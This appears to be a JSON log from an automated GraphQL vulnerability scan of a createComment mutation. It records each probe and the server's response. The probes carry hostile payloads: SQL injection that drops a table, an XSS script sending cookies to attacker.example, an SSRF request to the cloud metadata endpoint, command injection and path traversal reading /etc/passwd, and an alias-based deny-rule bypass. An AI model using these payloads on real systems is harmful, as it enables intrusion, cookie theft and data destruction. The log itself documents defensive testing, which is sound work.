@@ -1,0 +1,770 @@
+[
+  {
+    "query": {
+      "query": "\nmutation {\n  createComment(input: {name: \"Alice Tester\", email: \"alice.tester@example.com\", body: \"This is a normal comment used for a baseline test.\", postId: \"1\"}) {\n    id\n    name\n    email\n    body\n    post {\n      id\n      title\n    }\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.96,
+    "timestamp": "2025-10-05T18:09:57.169864Z",
+    "count": 1,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"postId\" is not defined by type \"CreateCommentInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 142
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createComment(input: {name: \"Robert'); DROP TABLE comments;--\", email: \"sqlinjection@example.com\", body: \"Testing SQL injection payload in name field\", postId: \"1\"}) {\n    id\n    name\n    email\n    body\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 1.103,
+    "timestamp": "2025-10-05T18:09:59.982464Z",
+    "count": 2,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"postId\" is not defined by type \"CreateCommentInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 155
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createComment(input: {name: \"XSS Tester\", email: \"xss@example.com\", body: \"<script>fetch('https://attacker.example/steal?c='+document.cookie)</script>Attempt XSS\", postId: \"1\"}) {\n    id\n    name\n    email\n    body\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.832,
+    "timestamp": "2025-10-05T18:10:03.108664Z",
+    "count": 3,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"postId\" is not defined by type \"CreateCommentInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 167
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createComment(input: {name: \"SSRF Probe\", email: \"ssrf@example.com\", body: \"Requesting internal metadata: http://169.254.169.254/latest/meta-data/\", postId: \"1\"}) {\n    id\n    name\n    email\n    body\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.865,
+    "timestamp": "2025-10-05T18:10:05.620680Z",
+    "count": 4,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"postId\" is not defined by type \"CreateCommentInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 152
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createComment(input: {name: \"Cmd Injection\", email: \"oscmd@example.com\", body: \"payload: $(cat /etc/passwd) || `ls -la /` ; echo done\", postId: \"1\"}) {\n    id\n    name\n    email\n    body\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.83,
+    "timestamp": "2025-10-05T18:10:08.429241Z",
+    "count": 5,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"postId\" is not defined by type \"CreateCommentInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 139
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createComment(input: {name: \"Path Traversal\", email: \"path@example.com\", body: \"../../../../../etc/passwd\", postId: \"1\"}) {\n    id\n    name\n    email\n    body\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.857,
+    "timestamp": "2025-10-05T18:10:12.081012Z",
+    "count": 6,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"postId\" is not defined by type \"CreateCommentInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 111
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createComment(input: {name: \"HTML Injector\", email: \"html@example.com\", body: \"<img src='x' onerror='alert(\\\"injection\\\")'>Injected HTML content\", postId: \"1\"}) {\n    id\n    name\n    email\n    body\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.811,
+    "timestamp": "2025-10-05T18:10:15.484431Z",
+    "count": 7,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"postId\" is not defined by type \"CreateCommentInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 150
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createComment(input: {name: \"Bypass Test\", email: \"bypass@example.com\", body: \"Non-aliased createComment call to test access controls\", postId: \"1\"}) {\n    id\n    name\n    email\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.817,
+        "timestamp": "2025-10-05T18:10:19.113408Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Field \"postId\" is not defined by type \"CreateCommentInput\".",
+              "locations": [
+                {
+                  "line": 3,
+                  "column": 139
+                }
+              ],
+              "extensions": {
+                "code": "GRAPHQL_VALIDATION_FAILED"
+              }
+            }
+          ]
+        }
+      },
+      "aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.851,
+        "timestamp": "2025-10-05T18:10:19.964531Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Field \"postId\" is not defined by type \"CreateCommentInput\".",
+              "locations": [
+                {
+                  "line": 3,
+                  "column": 187
+                }
+              ],
+              "extensions": {
+                "code": "GRAPHQL_VALIDATION_FAILED"
+              }
+            }
+          ]
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 8,
+    "timestamp": "2025-10-05T18:10:19.964680Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.786,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  s: createComment(input: {name: \"Bypass Test Alias\", email: \"bypass.alias@example.com\", body: \"Aliased createComment call: s: createComment(...) to test deny rules and alias handling\", postId: \"1\"}) {\n    id\n    name\n    email\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.797,
+        "timestamp": "2025-10-05T18:10:24.183088Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Field \"postId\" is not defined by type \"CreateCommentInput\".",
+              "locations": [
+                {
+                  "line": 3,
+                  "column": 139
+                }
+              ],
+              "extensions": {
+                "code": "GRAPHQL_VALIDATION_FAILED"
+              }
+            }
+          ]
+        }
+      },
+      "aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.889,
+        "timestamp": "2025-10-05T18:10:25.071939Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Field \"postId\" is not defined by type \"CreateCommentInput\".",
+              "locations": [
+                {
+                  "line": 3,
+                  "column": 187
+                }
+              ],
+              "extensions": {
+                "code": "GRAPHQL_VALIDATION_FAILED"
+              }
+            }
+          ]
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 9,
+    "timestamp": "2025-10-05T18:10:25.072060Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.806,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  createComment {\n    types {\n      name\n      kind\n    }\n    queryType { name }\n    mutationType { name }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.874,
+    "timestamp": "2025-10-05T18:10:29.119599Z",
+    "count": 10,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"createComment\" on type \"Query\". Did you mean \"comment\"?",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  createComment(name: \"Comment\") {\n    name\n    fields {\n      name\n      type {\n        name\n        kind\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 1.081,
+    "timestamp": "2025-10-05T18:10:32.689981Z",
+    "count": 11,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"createComment\" on type \"Query\". Did you mean \"comment\"?",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createComment(input: {name: \"Alice Tester\", email: \"alice.tester@example.com\", body: \"This is a normal comment used for a baseline test.\"}) {\n    id\n    name\n    email\n    body\n    post {\n      id\n      title\n    }\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.001,
+    "timestamp": "2025-10-05T18:11:05.598596Z",
+    "count": 12,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "createComment": {
+          "id": "501",
+          "name": "Alice Tester",
+          "email": "alice.tester@example.com",
+          "body": "This is a normal comment used for a baseline test.",
+          "post": {
+            "id": null,
+            "title": null
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createComment(input: {name: \"Robert'); DROP TABLE comments;--\", email: \"sqlinjection@example.com\", body: \"Attempt SQL injection via name field\"}) {\n    id\n    name\n    email\n    body\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.828,
+    "timestamp": "2025-10-05T18:11:08.308667Z",
+    "count": 13,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "createComment": {
+          "id": "501",
+          "name": "Robert'); DROP TABLE comments;--",
+          "email": "sqlinjection@example.com",
+          "body": "Attempt SQL injection via name field"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createComment(input: {name: \"XSS Tester\", email: \"xss@example.com\", body: \"<script>fetch('https://attacker.example/steal?c='+document.cookie)</script>Attempt XSS\"}) {\n    id\n    name\n    email\n    body\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.237,
+    "timestamp": "2025-10-05T18:11:11.549314Z",
+    "count": 14,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "createComment": {
+          "id": "501",
+          "name": "XSS Tester",
+          "email": "xss@example.com",
+          "body": "<script>fetch('https://attacker.example/steal?c='+document.cookie)</script>Attempt XSS"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createComment(input: {name: \"SSRF Probe\", email: \"ssrf@example.com\", body: \"Please fetch this URL: http://169.254.169.254/latest/meta-data/ to reveal instance metadata\"}) {\n    id\n    name\n    email\n    body\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.818,
+    "timestamp": "2025-10-05T18:11:15.281563Z",
+    "count": 15,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "createComment": {
+          "id": "501",
+          "name": "SSRF Probe",
+          "email": "ssrf@example.com",
+          "body": "Please fetch this URL: http://169.254.169.254/latest/meta-data/ to reveal instance metadata"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createComment(input: {name: \"Cmd Injection\", email: \"oscmd@example.com\", body: \"Injected command payload: $(cat /etc/passwd) || `ls -la /` ; echo done\"}) {\n    id\n    name\n    email\n    body\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.979,
+    "timestamp": "2025-10-05T18:11:17.778434Z",
+    "count": 16,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "createComment": {
+          "id": "501",
+          "name": "Cmd Injection",
+          "email": "oscmd@example.com",
+          "body": "Injected command payload: $(cat /etc/passwd) || `ls -la /` ; echo done"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createComment(input: {name: \"Path Traversal\", email: \"path@example.com\", body: \"../../../../../etc/passwd -- attempt path traversal in input\"}) {\n    id\n    name\n    email\n    body\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.851,
+    "timestamp": "2025-10-05T18:11:20.802662Z",
+    "count": 17,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "createComment": {
+          "id": "501",
+          "name": "Path Traversal",
+          "email": "path@example.com",
+          "body": "../../../../../etc/passwd -- attempt path traversal in input"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createComment(input: {name: \"HTML Injector\", email: \"html@example.com\", body: \"<img src=\\\"x\\\" onerror=\\\"alert('injection')\\\">Injected HTML content\"}) {\n    id\n    name\n    email\n    body\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.904,
+    "timestamp": "2025-10-05T18:11:23.754819Z",
+    "count": 18,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "createComment": {
+          "id": "501",
+          "name": "HTML Injector",
+          "email": "html@example.com",
+          "body": "<img src=\"x\" onerror=\"alert('injection')\">Injected HTML content"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createComment(input: {name: \"bypass-nonaliased\", email: \"bypass@example.com\", body: \"Testing access control bypass (non-aliased) - normal mutation shape\"}) {\n    id\n    name\n    email\n    body\n    post {\n      id\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 1.242,
+        "timestamp": "2025-10-05T18:11:26.971302Z",
+        "response_body": {
+          "data": {
+            "createComment": {
+              "id": "501",
+              "name": "bypass-nonaliased",
+              "email": "bypass@example.com",
+              "body": "Testing access control bypass (non-aliased) - normal mutation shape",
+              "post": {
+                "id": null
+              }
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.896,
+        "timestamp": "2025-10-05T18:11:27.867648Z",
+        "response_body": {
+          "data": {
+            "s": {
+              "id": "501",
+              "name": "bypass-aliased",
+              "email": "bypass.alias@example.com",
+              "body": "Testing access control bypass (aliased as s): ensure aliasing does not change enforcement",
+              "post": {
+                "id": null
+              }
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 19,
+    "timestamp": "2025-10-05T18:11:27.867695Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 1.099,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  s: createComment(input: {name: \"bypass-aliased\", email: \"bypass.alias@example.com\", body: \"Testing access control bypass (aliased as s): ensure aliasing does not change enforcement\"}) {\n    id\n    name\n    email\n    body\n    post {\n      id\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.831,
+        "timestamp": "2025-10-05T18:11:31.915021Z",
+        "response_body": {
+          "data": {
+            "createComment": {
+              "id": "501",
+              "name": "bypass-nonaliased",
+              "email": "bypass@example.com",
+              "body": "Testing access control bypass (non-aliased) - normal mutation shape",
+              "post": {
+                "id": null
+              }
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 1.066,
+        "timestamp": "2025-10-05T18:11:32.981605Z",
+        "response_body": {
+          "data": {
+            "s": {
+              "id": "501",
+              "name": "bypass-aliased",
+              "email": "bypass.alias@example.com",
+              "body": "Testing access control bypass (aliased as s): ensure aliasing does not change enforcement",
+              "post": {
+                "id": null
+              }
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 20,
+    "timestamp": "2025-10-05T18:11:32.981636Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.87,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  createComment {\n    queryType { name }\n    mutationType { name }\n    types {\n      name\n      kind\n      fields {\n        name\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.827,
+    "timestamp": "2025-10-05T18:11:37.515095Z",
+    "count": 21,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"createComment\" on type \"Query\". Did you mean \"comment\"?",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  createComment {\n    name\n    fields {\n      name\n      type {\n        name\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.961,
+    "timestamp": "2025-10-05T18:11:40.435709Z",
+    "count": 22,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"createComment\" on type \"Query\". Did you mean \"comment\"?",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  }
+]
